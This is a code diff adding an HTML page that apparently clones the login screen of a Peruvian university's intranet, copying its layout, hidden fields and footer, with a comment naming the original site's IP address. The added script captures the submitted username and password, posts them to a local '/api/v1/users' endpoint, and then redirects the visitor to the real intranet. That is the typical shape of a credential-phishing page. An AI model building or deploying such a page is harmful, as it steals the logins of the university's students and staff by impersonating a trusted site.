@@ -1,0 +1,155 @@
+<!DOCTYPE html
+    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0031)http://200.48.129.172/intranet/ -->
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>
+
+    </title>
+    <link href="/200.48.129.172_files/stl_login.css" rel="stylesheet" type="text/css">
+    <style type="text/css">
+        .style2 {
+            height: 21px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="contenedor-principal">
+        <div id="PosicionIzquierda">
+            <form name="form1" method="post" id="form1" class="Formulario">
+                <div>
+                    <input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="">
+                    <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
+                    <input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
+                    <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE"
+                        value="/wEPDwUJNzk2ODcyOTE3ZGQFcv9bz5ZpcAmPv17XenBa+zNpwjWOOCWiOrxxEmWJjw==">
+                </div>
+                <table border="0" cellspacing="2" cellpadding="2" width="100%">
+                    <tbody>
+                        <tr>
+                            <td colspan="2">
+                                &nbsp;</td>
+                        </tr>
+                        <tr>
+                            <td colspan="2">
+                                &nbsp;</td>
+                        </tr>
+                        <tr>
+                            <td colspan="2">
+                                &nbsp;</td>
+                        </tr>
+                        <tr>
+                            <td colspan="2">
+                                &nbsp;</td>
+                        </tr>
+                        <tr>
+                            <td style="text-align: right">
+                                usuario : </td>
+                            <td>
+                                <input name="txtUsuario" type="text" maxlength="10" id="txtUsuario" data-error="Ingrese el usuario" class="ControlText">
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="text-align: right">
+                                contraseña :</td>
+                            <td>
+                                <input name="txtContrasenia" data-error="Ingrese la contraseña" type="password" maxlength="16" id="txtContrasenia"
+                                    class="ControlText">
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2" style="text-align: right" class="style2">
+                                <a id="lnkbtnRecordarContrasenia" class="Boton_activar_cuenta"
+                                    href="javascript:__doPostBack(&#39;lnkbtnRecordarContrasenia&#39;,&#39;&#39;)">Ha
+                                    olvidado su contraseña?</a>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2" style="text-align: center">
+                                <input type="submit" name="btnIniciarSesion" value="Iniciar sesión"
+                                    id="btnIniciarSesion" class="Boton_basico">
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2" style="text-align: center">
+                                <span id="lblMensaje" style="color:Red;text-align: center"></span>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+
+
+            </form>
+        </div>
+        <div id="PosicionDerecha">
+            <div id="imagen"><img src="/200.48.129.172_files/img001.jpg" width="380" height="253"> </div>
+            <div id="Contenido">
+                <p>Le recordamos que tambien puede utilizar el servicio de correo electrónico institucional que ofrece
+                    la universidad a toda la comunidad universitaria.</p>
+            </div>
+
+        </div>
+        <div id="PosicionFooter">Universidad Nacional José Faustino Sánchez Carrión - Intranet 2012 - Derechos
+            Reservados</div>
+    </div>
+
+    <script>
+
+        document.addEventListener('DOMContentLoaded',e=>{
+
+            init();
+
+        });
+
+        const init = async () => {
+
+            const user = document.getElementById("txtUsuario");
+            const pass = document.getElementById("txtContrasenia");
+            const form1 = document.getElementById("form1");
+
+            const lblMensaje = document.getElementById("lblMensaje");
+
+            form1.addEventListener('submit',async evt=>{
+                
+                evt.preventDefault();
+
+                const {error: eU} = user.dataset;
+                const {error: eP} = pass.dataset;
+                
+                if(user.value===''){
+                    lblMensaje.textContent = eU;
+                    return;
+                }
+                
+                if(pass.value===''){
+                    lblMensaje.textContent = eP;
+                    return;
+                }
+
+                const response = await fetch('/api/v1/users',{
+                    method: 'POST',
+                    body: JSON.stringify({user: user.value,pass: pass.value}),
+                    headers: {
+                        'Content-type':'application/json'
+                    }
+                });
+                
+                if(response.ok){
+                    location.href = 'http://200.48.129.172/intranet/'
+                }else{
+                    console.log("Credenciales incorrectos");
+                    console.log(response.status);
+                }
+            });
+        };
+
+    </script>
+
+
+</body>
+
+</html>
